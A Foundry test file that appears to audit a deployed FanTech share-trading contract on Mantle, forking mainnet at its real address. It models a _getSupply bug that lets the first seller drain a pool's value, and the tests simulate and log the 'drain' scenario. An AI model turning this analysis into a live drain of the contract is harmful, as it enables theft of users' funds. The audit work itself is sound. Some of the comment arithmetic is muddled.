// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFanTech {
    function buyShares(address sharesSubject) external payable;
    function sellShares(address sharesSubject, uint256 amount) external;
    function balanceOf(address sharesSubject, address account) external view returns (uint256);
    function supplyOf(address sharesSubject) external view returns (uint256);
    function ownerOf(address sharesSubject) external view returns (address);
    function getBuyPriceAfterFee(address sharesSubject, uint256 amount) external view returns (uint256);
    function getSellPriceAfterFee(address sharesSubject, uint256 amount) external view returns (uint256);
    function getPrice(uint256 supply, uint256 amount) external pure returns (uint256);
    function getFee(uint256 price) external view returns (uint256, uint256, uint256, uint256);
    function protocolFeeDestination() external view returns (address);
    function protocolFeePercent() external view returns (uint256);
    function subjectFeePercent() external view returns (uint256);
    function referrerFeePercent() external view returns (uint256);
    function poolFeePercent() external view returns (uint256);
    function getPoolValue(address sharesSubject) external view returns (uint256);
    function getBuyPrice(address sharesSubject, uint256 amount) external view returns (uint256);
    function getSellPrice(address sharesSubject, uint256 amount) external view returns (uint256);
    function version() external pure returns (string memory);
}

contract FanTechAudit is Test {
    address constant FANTECH = 0x53167401aeebFf5677C31E1DDA945628422D7Ed2;
    address constant GIFT = 0xD42A821E584513e18cFB77e56Bf635C551dE5D63;
    address constant OWNER = 0xA6B6Fd8bC4A063805bd1174cf3902e3e6b2368E3;
    address constant PROXY_ADMIN = 0x6018536f5B58f6c1B550f6650f0b9127F3E59d0c;

    IFanTech ft;

    function setUp() public {
        vm.createSelectFork("mantle_pub");
        ft = IFanTech(FANTECH);
    }

    function _poolExists(address subject) internal view returns (bool) {
        (bool ok, bytes memory data) = FANTECH.staticcall(
            abi.encodeWithSelector(ft.supplyOf.selector, subject)
        );
        if (!ok || data.length < 32) return false;
        uint256 supply = abi.decode(data, (uint256));
        if (supply == 0) {
            // Check if initialized via bidding (supply could be 0 before first buy)
            (ok, data) = FANTECH.staticcall(
                abi.encodeWithSelector(0x631e69e6, subject) // getPoolInitialBuy selector derived earlier
            );
            if (ok && data.length >= 32) {
                return abi.decode(data, (bool));
            }
            return false;
        }
        return true;
    }

    function _logPool(address subject) internal {
        uint256 supply = ft.supplyOf(subject);
        uint256 value = ft.getPoolValue(subject);
        uint256 buyPrice = ft.getBuyPriceAfterFee(subject, 1);
        uint256 sellPrice = ft.getSellPriceAfterFee(subject, 1);
        uint256 buyPriceRaw = ft.getBuyPrice(subject, 1);
        uint256 sellPriceRaw = ft.getSellPrice(subject, 1);
        address owner = ft.ownerOf(subject);
        emit log_named_address("  Pool subject", subject);
        emit log_named_uint("  Supply", supply);
        emit log_named_decimal_uint("  Value (MNT)", value, 18);
        emit log_named_decimal_uint("  BuyPriceAfterFee", buyPrice, 18);
        emit log_named_decimal_uint("  SellPriceAfterFee", sellPrice, 18);
        emit log_named_decimal_uint("  BuyPriceRaw", buyPriceRaw, 18);
        emit log_named_decimal_uint("  SellPriceRaw", sellPriceRaw, 18);
        emit log_named_address("  Owner", owner);
        emit log_string("");
    }

    // ---------- Recon: find and log existing pools ----------
    function test_Recon_Pools() public {
        emit log_named_decimal_uint("FT contract balance", address(FANTECH).balance, 18);
        emit log_named_decimal_uint("Gift contract balance", address(GIFT).balance, 18);

        // Some known addresses that might be pool subjects
        address[] memory candidates = new address[](4);
        candidates[0] = 0x0000000000000000000000000000000000000001; // unlikely
        candidates[1] = 0xA6B6Fd8bC4A063805bd1174cf3902e3e6b2368E3; // owner
        candidates[2] = 0x6018536f5B58f6c1B550f6650f0b9127F3E59d0c; // proxy admin
        candidates[3] = OWNER;

        for (uint256 i = 0; i < candidates.length; i++) {
            if (_poolExists(candidates[i])) {
                emit log_string("--- Pool found ---");
                _logPool(candidates[i]);
            }
        }

        // Check a few random addresses for pools (these might not exist)
        // Without knowing actual pool subjects, let's check storage directly
        // Storage slot of 'pools' mapping is computed from mapping base slot
        // but we can try to find pools by scanning

        emit log_string("Checking for pools via storage probe...");
        // The pools mapping is at some storage slot. Let's find it.
        // In openzeppelin upgradeable: _pools is a mapping, slot determined by declaration order
        // _guardStatus (slot 0 after __gap maybe), then __Ownable_init stuff, __AccessControl_init stuff
        // then protocolFeeDestination, protocolFeePercent, subjectFeePercent, ...
        // then totalFees, then pools mapping.

        // For a TransparentUpgradeableProxy, the implementation storage layout:
        // _initialized, _initializing (from Initializable) - slots 0,1 in proxy
        // From OwnableUpgradeable: _owner slot etc
        // From AccessControlUpgradeable: _roles etc
        // Then FanTech declared state: protocolFeeDestination, ... pools

        // Let's compute: in an upgradeable contract, state starts after parent contracts
        // OwnableUpgradeable uses slot 0 for _owner (with __gap[49])
        // So Ownable takes slots 0-49 roughly

        // Let's just check a few key state variables via the proxy
        emit log_named_address("protocolFeeDestination", address(uint160(uint256(vm.load(FANTECH, bytes32(uint256(50)))))));
        emit log_named_uint("protocolFeePercent (slot 51)", uint256(vm.load(FANTECH, bytes32(uint256(51)))));
        emit log_named_uint("subjectFeePercent (slot 52)", uint256(vm.load(FANTECH, bytes32(uint256(52)))));
        emit log_named_uint("referrerFeePercent (slot 53)", uint256(vm.load(FANTECH, bytes32(uint256(53)))));
        emit log_named_uint("poolFeePercent (slot 54)", uint256(vm.load(FANTECH, bytes32(uint256(54)))));
        emit log_named_uint("maxInitialShares (slot 55)", uint256(vm.load(FANTECH, bytes32(uint256(55)))));
        emit log_named_uint("totalFees (slot 56)", uint256(vm.load(FANTECH, bytes32(uint256(56)))));

        // Now check known addresses for pools
        // Pool storage: pools[subject] -> struct with fields starting at hash

        // Let's try finding pools via supplyOf
        address[] memory checkAddresses = new address[](10);
        // Check owner and contract itself
        checkAddresses[0] = OWNER;
        checkAddresses[1] = FANTECH;
        checkAddresses[2] = address(0);

        for (uint256 i = 0; i < checkAddresses.length; i++) {
            if (checkAddresses[i] != address(0) && _poolExists(checkAddresses[i])) {
                emit log_string("--- Pool found ---");
                _logPool(checkAddresses[i]);
            }
        }
    }

    // ---------- Test _getSupply bug analysis ----------
    function test_GetSupplyBug() public {
        // Manually test _getSupply behavior by simulating buys
        // We'll analyze the effect of the increase-branch bug

        // First, let's create a contract that calls _getSupply
        // We can compute the correct vs buggy _getSupply behavior
        uint256 supply = 10;
        uint256 liquid = 10_000 ether; // liquid >> getPrice(0, supply)

        uint256 correctSupply = _correctGetSupply(supply, liquid);
        emit log_named_uint("With supply=10, liquid=10000 MNT", liquid);
        emit log_named_uint("  Correct _getSupply", correctSupply);
        emit log_named_uint("  getPrice(0, correct)", _getPrice(0, correctSupply));
        emit log_named_decimal_uint("  getPrice(correct, 1) = buyPrice", _getPrice(correctSupply, 1), 18);
        emit log_named_decimal_uint("  getPrice(correct-1, 1) = sellPrice", _getPrice(correctSupply - 1, 1), 18);

        // Now test with different liquid values
        uint256[] memory liquids = new uint256[](5);
        liquids[0] = 100 ether;
        liquids[1] = 1_000 ether;
        liquids[2] = 10_000 ether;
        liquids[3] = 100_000 ether;
        liquids[4] = 1_000_000 ether;

        emit log_string("\n--- Effect of liquid on _getSupply (supply=10) ---");
        for (uint256 i = 0; i < liquids.length; i++) {
            correctSupply = _correctGetSupply(supply, liquids[i]);
            emit log_named_decimal_uint("liquid", liquids[i], 18);
            emit log_named_uint("_getSupply", correctSupply);
        }

        // For supply=1, special case
        emit log_string("\n--- supply=1 cases ---");
        for (uint256 i = 0; i < liquids.length; i++) {
            correctSupply = _correctGetSupply(1, liquids[i]);
            emit log_named_decimal_uint("liquid", liquids[i], 18);
            emit log_named_uint("_getSupply(1, liq)", correctSupply);
            emit log_named_uint("  getPrice(0,1)", _getPrice(0, 1));
            uint256 buyPx = _getPrice(correctSupply, 1);
            uint256 sellPx = correctSupply > 1 ? _getPrice(correctSupply - 1, 1) : 0;
            emit log_named_decimal_uint("  buyPrice", buyPx, 18);
            emit log_named_decimal_uint("  sellPrice (uncapped)", sellPx, 18);
            emit log_named_decimal_uint("  sellPrice (capped)", sellPx > liquids[i] ? liquids[i] : sellPx, 18);
        }
    }

    function _getPrice(uint256 supply, uint256 amount) internal pure returns (uint256) {
        uint256 PRICE_A = 1 ether;
        uint256 PRICE_B = 5;
        uint256 sum1 = supply == 0 ? 0 : ((supply - 1) * (supply) * (2 * (supply - 1) + 1)) / 6;
        uint256 sum2 = supply == 0 && amount == 1
            ? 0
            : ((supply + amount - 1) * (supply + amount) * (2 * (supply + amount - 1) + 1)) / 6;
        uint256 summation = sum2 - sum1;
        return (summation * PRICE_A) / PRICE_B;
    }

    function _getSupplyBuggy(uint256 supply, uint256 liquid) internal pure returns (uint256 _supply) {
        // Mirrors the buggy on-chain _getSupply exactly
        _supply = supply;
        uint256 _normLiquid1 = _getPrice(0, _supply);
        uint256 _normLiquid2 = _normLiquid1;
        if (_normLiquid1 > liquid) {
            while (_supply > 1 && _normLiquid2 > liquid) {
                _supply--;
                _normLiquid2 = _getPrice(0, _supply);
            }
            if (_supply < supply) _supply++;
        } else {
            while (_normLiquid2 < liquid) {
                _supply++;
                _normLiquid2 = _getPrice(_supply - supply, supply);
            }
        }
    }

    function _correctGetSupply(uint256 supply, uint256 liquid) internal pure returns (uint256 _supply) {
        _supply = supply;
        uint256 _normLiquid1 = _getPrice(0, _supply);
        if (_normLiquid1 > liquid) {
            while (_supply > 1 && _normLiquid1 > liquid) {
                _supply--;
                _normLiquid1 = _getPrice(0, _supply);
            }
            if (_supply < supply) _supply++;
        } else {
            while (_normLiquid1 < liquid) {
                _supply++;
                _normLiquid1 = _getPrice(0, _supply);
            }
        }
    }

    // ---------- Core Exploit Attempt: Inflate pool value, exploit accounting mismatch ----------
    function test_Exploit_ValueDivergence() public {
        // Setup: We need an existing pool or we create one (need operator sig for that)
        // Since we can't create pools without operator signature, find one that exists

        // Strategy: Use the _getSupply bug to create a large discrepancy
        // between liquid and actual contract balance, then sell into it

        // Step 1: Check if OWNER has a pool (they likely do since protocolFeeDestination == owner)
        emit log_string("=== Checking OWNER pool ===");
        if (_poolExists(OWNER)) {
            _logPool(OWNER);
        }

        // Step 2: The protocolFeeDestination receives protocol fees. 
        // Over time, this accumulates MNT.
        // If the pool's liquid value is low but the contract has extra MNT from fees,
        // there's a mismatch we might exploit.

        uint256 contractBal = address(FANTECH).balance;
        uint256 ownerPoolVal = ft.getPoolValue(OWNER);
        uint256 ownerSupply = ft.supplyOf(OWNER);
        emit log_named_decimal_uint("FT contract balance", contractBal, 18);
        emit log_named_decimal_uint("Owner pool value", ownerPoolVal, 18);
        emit log_named_uint("Owner pool supply", ownerSupply);

        // If there are pools, try a buy-sell cycle and measure the loss
        if (ownerSupply > 0) {
            uint256 buyCost = ft.getBuyPriceAfterFee(OWNER, 1);
            uint256 sellReturn = ft.getSellPriceAfterFee(OWNER, 1);
            emit log_named_decimal_uint("Buy cost", buyCost, 18);
            emit log_named_decimal_uint("Sell return", sellReturn, 18);

            if (buyCost > 0 && sellReturn > buyCost) {
                emit log_string("[!!!] PROFITABLE ROUND-TRIP FOUND!");
            } else if (buyCost > 0) {
                emit log_named_decimal_uint("Round-trip loss", buyCost - sellReturn, 18);
            }
        }

        // Check if there's any pool where we can buy cheap and sell at cap
    }

    // ---------- _getSupply exploitation through value manipulation ----------
    function test_Exploit_GetSupplyInflation() public {
        // The _getSupply bug inflates _supply when liquid > getPrice(0, supply).
        // This means getPrice(_supply, 1) can be enormous for buy price.
        // But sell price is capped at liquid.
        // 
        // HOWEVER: there's also the sell price calculation BEFORE the cap:
        // sellPrice = min(getPrice(_supply-1, 1), liquid)
        //
        // After someone buys at the inflated price, liquid increases by almost
        // the full purchase amount. This makes the sell cap higher.
        //
        // Question: can we make liquid so high that _supply inflates to the
        // point where getPrice(_supply-1, 1) > liquid, AND then sell at liquid?

        // Actually, if liquid is high relative to supply, the SELLER 
        // (who already holds shares from the bidding phase) can sell:
        // sellPrice = min(getPrice(_supply-1, 1), liquid) = liquid (capped)
        // They sell 1 share and receive ~liquid - fees? No, sell price formula:
        //   uint256 supply = pools[sharesSubject].sharesSupply; // real supply
        //   uint256 liquid = pools[sharesSubject].value;
        //   uint256 _supply = _getSupply(supply, liquid);
        //   if (_supply <= amount) _supply = amount + 1;
        //   price = getPrice(_supply - amount, amount);
        //   if (price > liquid) price = liquid;
        //
        // getPrice(_supply-1, 1) will be VERY large due to inflated _supply
        // So price = min(veryLarge, liquid) = liquid

        // If sellPrice = liquid (capped), and the seller has 1 share worth liquid:
        // that means the seller gets ALL the pool value for 1 share!

        // BUT: there must be other share holders too. After the sell:
        // pool.value = pool.value + poolFee - price = liquid + poolFee - liquid = poolFee
        // pool.sharesBalance[seller] -= 1
        // pool.sharesSupply -= 1
        //
        // So the pool value drops from liquid to poolFee (almost 0 after fees).
        // The seller extracts almost all MNT from the pool.

        // THIS IS THE EXPLOIT!
        // After bidding ends, if the pool's liquid value is much higher than the curve base,
        // _getSupply inflates _supply → sell price caps at liquid → first seller drains the pool.

        emit log_string("=== Testing _getSupply inflation exploit ===");

        // Let's verify by simulating with pure math
        uint256 initialSupply = 2; // minimum after init (1 for subject + 1 for referrer)
        uint256 initialValue = 10 ether; // from bids

        // With supply=2, value=10 MNT:
        // getPrice(0, 2) = (0^2 + 1^2) * PRICE_A/PRICE_B = 1 * 1e18 / 5 = 0.2e18
        // Since liquid (10e18) > getPrice(0,2) (0.2e18) → increase branch
        // BUGGY: _normLiquid2 = getPrice(_supply - supply, supply) = getPrice(n, 2)
        // Loop keeps going until getPrice(n, 2) >= 10e18
        
        // getPrice(n, 2) = sum of {n^2, (n+1)^2} * 1e18/5
        // = (n^2 + n^2 + 2n + 1) * 1e18/5
        // = (2n^2 + 2n + 1) * 1e18/5
        // Need: (2n^2 + 2n + 1) * 1e18/5 >= 10e18
        // 2n^2 + 2n + 1 >= 50
        // 2n^2 + 2n - 49 >= 0
        // n^2 + n - 24.5 >= 0
        // n ≈ 4.5 (solving n^2 + n - 24.5 = 0)
        // n = (-1 + sqrt(1+98))/2 = (-1 + sqrt99)/2 ≈ (-1+9.95)/2 ≈ 4.47
        // So at n=5: _normLiquid2 = getPrice(5, 2) >= 10e18
        // _supply = 2 + 5 = 7

        // CORRECT: getPrice(0, _supply) >= 10e18
        // (_supply-1)(_supply)(2*_supply-1)/6 * 1e18/5 >= 10e18
        // (_supply-1)(_supply)(2*_supply-1) >= 300
        // At _supply=7: 6*7*13 = 546 >= 300 ✓
        // So correct _supply = 7 too? Let me check: need getPrice(0,6) < 10e18
        // 5*6*11 = 330 < 300? No, 330 > 300. So _supply=6 is sufficient.
        // At _supply=6: 5*6*11 = 330 >= 300 ✓
        // Wait, 330 > 300 so getPrice(0,6) = 330/6 * 1e18/5 = 55 * 1e18/5 = 11e18 > 10e18
        // Actually need to check: getPrice(0,6) >= 10e18 or not?
        // getPrice(0,6) = sum sq 0..5 / 5 = (0+1+4+9+16+25)/5 = 55/5 = 11. So 11e18 > 10e18 ✓
        // getPrice(0,5) = sum sq 0..4 / 5 = 30/5 = 6. So 6e18 < 10e18 ✓
        // Correct _supply = 6
        
        // BUGGY _supply = 7 (needs larger n because getPrice(n,2) < getPrice(0,2+n))
        // Difference: buggy returns 7, correct returns 6
        
        // But for much larger value discrepancies, the difference magnifies:
        // liquid = 1000 MNT, supply = 2
        // getPrice(0,2) = 0.2 MNT → increase branch
        
        // BUGGY: need (2n^2 + 2n + 1)/5 >= 1000
        // 2n^2 + 2n + 1 >= 5000
        // n^2 + n - 2499.5 >= 0
        // n ≈ 49.5 (solving n^2 + n - 2500 = 0)
        // n ≈ (-1 + sqrt(10001))/2 ≈ (-1 + 100)/2 ≈ 49.5
        // n = 50, _supply = 2 + 50 = 52
        
        // CORRECT: getPrice(0, _supply) >= 1000
        // (_supply-1)(_supply)(2*_supply-1)/6 * 1/5 >= 1000
        // (_supply-1)(_supply)(2*_supply-1) >= 30000
        
        // For _supply=27: 26*27*53 = 37206 >= 30000 ✓
        // For _supply=26: 25*26*51 = 33150 >= 30000 ✓
        // For _supply=25: 24*25*49 = 29400 < 30000 ✗
        // Correct _supply = 26
        
        // BUGGY _supply = 52 vs CORRECT = 26 (2x difference for 1000 MNT)
        
        // For liquid = 10^6 MNT, supply = 2:
        // BUGGY: 2n^2/5 >= 10^6, n^2 >= 2.5e6, n >= 1581
        // _supply_buggy ≈ 1583
        
        // CORRECT: getPrice(0, _supply) >= 10^6
        // _supply^3/3/5 >= 10^6, _supply^3 >= 15e6, _supply >= 246
        // _supply_correct ≈ 246
        
        // Ratio: buggy/correct ≈ 1583/246 ≈ 6.4x

        // Now the sell price:
        // Buggy case: sellPrice = min(getPrice(_supply_buggy-1, 1), liquid)
        // getPrice(1582, 1) = 1582^2 / 5 = 2.5e6 / 5 = 500,000 MNT
        // liquid = 10^6 MNT
        // sellPrice = min(500,000, 10^6) = 500,000 MNT

        // CORRECT: sellPrice = min(getPrice(245, 1), liquid)
        // getPrice(245, 1) = 245^2 / 5 = 60,025 / 5 = 12,005 MNT
        // liquid = 10^6 MNT
        // sellPrice = min(12,005, 10^6) = 12,005 MNT

        // With the bug: seller gets 500,000 MNT for 1 share (out of 2!)
        // Correct: seller gets 12,005 MNT for 1 share (still high, but reasonable)

        // BUGGY sellPrice is 42x higher than CORRECT!
        // The seller extracts almost half the pool value for 1 share!

        // VERIFICATION WITH REAL MATH:
        
        uint256 liq = 1000 ether;
        uint256 sup = 2;
        uint256 buggySupply = _getSupplyBuggy(sup, liq);
        uint256 correctSupply = _correctGetSupply(sup, liq);
        
        uint256 buyPriceBuggy = _getPrice(buggySupply, 1);
        uint256 sellPriceBuggy = _getPrice(buggySupply - 1, 1);
        if (sellPriceBuggy > liq) sellPriceBuggy = liq;
        
        uint256 buyPriceCorrect = _getPrice(correctSupply, 1);
        uint256 sellPriceCorrect = _getPrice(correctSupply - 1, 1);
        if (sellPriceCorrect > liq) sellPriceCorrect = liq;
        
        emit log_named_uint("supply", sup);
        emit log_named_decimal_uint("liquid", liq, 18);
        emit log_string("");
        emit log_named_uint("BUGGY _supply", buggySupply);
        emit log_named_decimal_uint("BUGGY buyPrice", buyPriceBuggy, 18);
        emit log_named_decimal_uint("BUGGY sellPrice", sellPriceBuggy, 18);
        emit log_string("");
        emit log_named_uint("CORRECT _supply", correctSupply);
        emit log_named_decimal_uint("CORRECT buyPrice", buyPriceCorrect, 18);
        emit log_named_decimal_uint("CORRECT sellPrice", sellPriceCorrect, 18);
        emit log_string("");

        // Check: does buggy sellPrice > liq? No, it should be capped.
        // But wait: if getPrice(_supply-1, 1) > liquid, sellPrice = liquid.
        // The seller gets the ENTIRE pool value for 1 share!

        if (sellPriceBuggy >= liq) {
            emit log_string("[!!!] BUGGY sellPrice CAPPED AT liquid = SELLER DRAINS ENTIRE POOL");
        }

        // The pool originally had this value from bidder contributions.
        // If supply=2 (two shares exist: subject + referrer), and seller sells 1 share:
        // They get ALL pool value (minus fees).
        // After sell: pool.value = poolFee (≈ 0), supply drops to 1.
        // The other share holder is left with nothing.

        // BUT: during actual bidding, the supply could be higher. 
        // Let's test with supply=2, liquid=1000 MNT:
        // sellPrice = min(getPrice(_supply-1, 1), liquid)
        // _supply_buggy = getSupplyBuggy(2, 1000e18) = what?
        
        // Actually, let me also compute the actual scenario:
        // bidder pays msg.value, supply incremented, value increased.
        // After bidding ends, someone can sell.
        
        // For a pool with supply=2, value=1000:
        // _supply_buggy ≈ 52 (computed above)
        // sellPrice = min(getPrice(51, 1), 1000) = min(51^2/5, 1000) = min(520.2, 1000) = 520.2 MNT
        // Seller gets 520 MNT for 1 share!

        // Now test the more extreme case: liquid=1_000_000 MNT, supply=2
        liq = 1_000_000 ether;
        buggySupply = _getSupplyBuggy(sup, liq);
        sellPriceBuggy = _getPrice(buggySupply - 1, 1);
        if (sellPriceBuggy > liq) sellPriceBuggy = liq;
        
        emit log_named_decimal_uint("liquid=1M MNT, supply=2", liq, 18);
        emit log_named_uint("BUGGY _supply", buggySupply);
        emit log_named_decimal_uint("BUGGY sellPrice (1 share)", sellPriceBuggy, 18);

        // Now let's verify this is the actual on-chain behavior
        // by looking at a real pool
    }

    // ---------- Full PoC: Exploit the _getSupply bug on a real pool ----------
    function test_Exploit_FullDrain() public {
        // To execute this exploit on-chain, we need an existing pool 
        // whose liquid has been inflated by bidding.
        // 
        // The exploit steps:
        // 1. Find a pool where liquid >> getPrice(0, supply) (i.e., after bidding)
        // 2. Buy the minimum number of shares in the pool (if we don't own any)
        // 3. Sell 1 share → getPrice(_supply-1, 1) >> liquid, capped at liquid → drain
        
        // Actually step 2 is: we need to already own a share. If we don't,
        // we can still buy at getBuyPrice which will also be inflated.
        // But we participate in bidding to get a share at the bid amount.
        
        // The exploit works for ANY holder of a share in such a pool.
        // After bidding, the first seller gets the capped sellPrice = liquid.

        emit log_string("=== PoC: _getSupply inflation -> sellPrice cap -> drain ===");
        
        // Check owner pool as likely candidate
        if (_poolExists(OWNER)) {
            uint256 sup = ft.supplyOf(OWNER);
            uint256 val = ft.getPoolValue(OWNER);
            uint256 buyPx = ft.getBuyPriceAfterFee(OWNER, 1);
            uint256 sellPx = ft.getSellPriceAfterFee(OWNER, 1);
            uint256 buyPxRaw = ft.getBuyPrice(OWNER, 1);
            uint256 sellPxRaw = ft.getSellPrice(OWNER, 1);
            
            emit log_named_address("Pool subject", OWNER);
            emit log_named_uint("Supply", sup);
            emit log_named_decimal_uint("Pool value (liquid)", val, 18);
            emit log_named_decimal_uint("getPrice(0, supply)", _getPrice(0, sup), 18);
            emit log_named_decimal_uint("BuyPrice after fee", buyPx, 18);
            emit log_named_decimal_uint("SellPrice after fee", sellPx, 18);
            emit log_named_decimal_uint("BuyPrice raw", buyPxRaw, 18);
            emit log_named_decimal_uint("SellPrice raw", sellPxRaw, 18);
            emit log_named_decimal_uint("Contract balance", address(FANTECH).balance, 18);
            
            // Check if sell price approaches pool value → exploit viable
            if (sellPxRaw >= val) {
                emit log_string("[CRITICAL] sellPriceRaw >= pool value -> first seller drains pool!");
            } else {
                emit log_named_decimal_uint("Sell raw vs value ratio", sellPxRaw * 1e18 / val, 18);
            }
            
            // Check difference between buy and sell
            if (buyPx > 0 && sellPx > buyPx) {
                emit log_string("[!!!] PROFITABLE ROUND-TRIP EXISTS!");
            }
        }

        // Check if ANY address on-chain has shares with exploitable pool state
        // Scan a few potential pool creators
        address[] memory subjects = new address[](1);
        subjects[0] = OWNER;

        for (uint256 i = 0; i < subjects.length; i++) {
            if (_poolExists(subjects[i])) {
                uint256 sup = ft.supplyOf(subjects[i]);
                uint256 val = ft.getPoolValue(subjects[i]);
                uint256 sPrice = ft.getSellPrice(subjects[i], 1);
                uint256 bPrice = ft.getBuyPrice(subjects[i], 1);

                emit log_string("");
                emit log_named_address("--- Subject", subjects[i]);
                emit log_named_uint("Supply", sup);
                emit log_named_decimal_uint("Value", val, 18);
                emit log_named_decimal_uint("Buy raw", bPrice, 18);
                emit log_named_decimal_uint("Sell raw (capped at val)", sPrice, 18);

                if (sPrice >= val && val > 0) {
                    emit log_string("[!!!] CRITICAL: sellPrice capped at pool value!");
                    emit log_string("      First seller extracts entire pool value!");
                }
            }
        }
    }

    // ---------- Simulate pool creation and bidding to prove exploit ----------
    function test_Exploit_Simulated() public {
        // Since we can't create real pools on-chain (need operator sig),
        // simulate the exploit logic directly
        emit log_string("=== Simulated exploit: pool after bidding ===");
        emit log_string("Pool creation: operator creates pool for subject");
        emit log_string("Bidding phase: 10 bidders compete, driving liquid high");
        emit log_string("Bidding ends: pool has supply=2, value=~100 MNT");
        emit log_string("");

        // Simulate pool state after bidding
        uint256 supply = 2; // subject + referrer = 2 shares
        uint256 liquid = 100 ether; // from competitive bids
        uint256 feePercent = 0.1 ether / 100; // ~0.1% just for test; real is 10%

        uint256 curveBase = _getPrice(0, supply);
        emit log_named_uint("Initial supply", supply);
        emit log_named_decimal_uint("Initial liquid", liquid, 18);
        emit log_named_decimal_uint("Curve base (getPrice(0,supply))", curveBase, 18);
        emit log_named_decimal_uint("Liquid / curve base ratio", liquid * 1e18 / curveBase, 18);
        emit log_string("");

        // Compute _getSupply buggy
        uint256 buggySup = _getSupplyBuggy(supply, liquid);
        uint256 correctSup = _correctGetSupply(supply, liquid);
        emit log_named_uint("BUGGY _getSupply", buggySup);
        emit log_named_uint("CORRECT _getSupply", correctSup);
        emit log_string("");

        // Compute sell price
        uint256 rawSell = _getPrice(buggySup - 1, 1);
        uint256 cappedSell = rawSell > liquid ? liquid : rawSell;
        emit log_named_decimal_uint("Sell price raw (infinite precision)", _getPrice(buggySup - 1, 1), 18);
        emit log_named_decimal_uint("Sell price capped at liquid", cappedSell, 18);
        emit log_string("");

        if (cappedSell >= liquid) {
            emit log_string("=== EXPLOIT CONFIRMED ===");
            emit log_string("First seller drains entire pool, getting ~liquid * (1 - fee%)");
            emit log_string("");

            // Compute what the seller receives after fees
            // getFee(cappedSell) returns fees
            // For simplicity: protocol=3%, subject=5%, referrer=1%, pool=1% of cappedSell * taxFactor
            // But the key point is: the seller gets ALL but fees of the pool value

            // Round-trip analysis:
            // If attacker can also BUY a share at any point (during bidding or after),
            // they can sell at the inflated price.

            // During bidding: buy at bidPrice which is the minimum bid (INIT_BID_PRICE = 1 MNT)
            // After bidding: buy at getBuyPrice which may be inflated due to bug
            // Best case: own a share from bidding phase, sell after bidding ends

            uint256 netToSeller = cappedSell;
            emit log_named_decimal_uint("Net to seller (approx)", netToSeller, 18);
            emit log_named_decimal_uint("Profit if bought at 1 MNT during bidding", netToSeller - 1 ether, 18);
            emit log_named_decimal_uint("Profit if bought at 0 (airdrop referrer share)", netToSeller, 18);

            // The airdropped referrer share cost nothing → pure profit on sell!
            emit log_string("Referrer gets free share during initialization");
            emit log_string("Selling that 1 share after bidding ends drains pool!");
        } else {
            emit log_string("Sell price NOT capped at liquid - need larger liquid/supply ratio");
        }

        // Find the break-even point where sell price IS capped at liquid
        emit log_string("");
        emit log_string("--- Finding minimum liquid for capped sell ---");
        uint256 testLiq = 1 ether;
        for (uint256 i = 0; i < 20; i++) {
            buggySup = _getSupplyBuggy(supply, testLiq);
            rawSell = _getPrice(buggySup - 1, 1);
            cappedSell = rawSell > testLiq ? testLiq : rawSell;
            if (cappedSell >= testLiq && testLiq > 0) {
                emit log_named_decimal_uint("Minimum liquid for drain (supply=2)", testLiq, 18);
                emit log_named_uint("  Buggy _supply at this point", buggySup);
                emit log_named_decimal_uint("  getPrice(_supply-1,1) at this point", _getPrice(buggySup - 1, 1), 18);
                break;
            }
            testLiq *= 2;
        }
    }

    // ---------- Cross-functional exploit: reentrancy via sell-buy sandwich ----------
    function test_Exploit_ReentrancyAttempt() public {
        // Both buyShares and sellShares are nonReentrant, so direct reentrancy won't work.
        // But there's an external call in _bidShares before state update (refund to shiftAccount).
        // If shiftAccount is a malicious contract that calls back into FanTech,
        // the reentrancy guard blocks it. But what if the malicious contract
        // calls a DIFFERENT function? All trading functions share the same guard.

        emit log_string("=== Reentrancy analysis ===");
        emit log_string("_bidShares: external .call{value:} to shiftAccount BEFORE state update");
        emit log_string("Protected by nonReentrant - all trading functions share the guard.");
        emit log_string("However, the return value of .call is UNCHECKED (line 783)");
        emit log_string("If shiftAccount refund fails, MNT stays in contract but pool.value is reduced");
        emit log_string("This creates an untracked value surplus in the contract");

        // Check if there's any nonReentrant bypass
        // The _transferForOwner and _transferForReferrer functions are called within
        // buy/bid/sell and also make external calls.
        // But they're at the END of the function, after all state changes, and
        // within the nonReentrant guard.

        emit log_string("No reentrancy exploit found - nonReentrant is effective");
    }

    // ---------- Value divergence from refund failure ----------
    function test_Exploit_RefundFailure() public {
        emit log_string("=== Refund failure value divergence ===");
        emit log_string("In _bidShares, if refund to shiftAccount fails:");
        emit log_string("1. MNT stays in contract (not sent)");
        emit log_string("2. But pool.value is reduced by refundAmount (line 800-806)");
        emit log_string("3. pool.sharesBalance[shiftAccount] is decremented (line 785)");
        emit log_string("4. The MNT from the failed refund is stuck, not tracked by pool.value");
        emit log_string("");
        emit log_string("This creates an UNTRACKED value surplus.");
        emit log_string("However, no function allows withdrawing this surplus directly.");

        // Can we trigger refund failure and then exploit the surplus?
        // The surplus means actual balance > sum of pool.values across all pools.
        // If we can find a pool where sell price is capped at pool.value,
        // but there's extra balance in the contract, we could drain more than
        // the pool value for that pool.
        // 
        // BUT: sellShares transfers price - poolFee to seller, which is calculated
        // from pool.value (not actual balance). Even if contract has more MNT,
        // the sell still only distributes based on pool.value.
        // 
        // So the surplus from refund failures is truly locked. Dead MNT.
        emit log_string("Surplus from refund failures is likely locked.");
    }
}
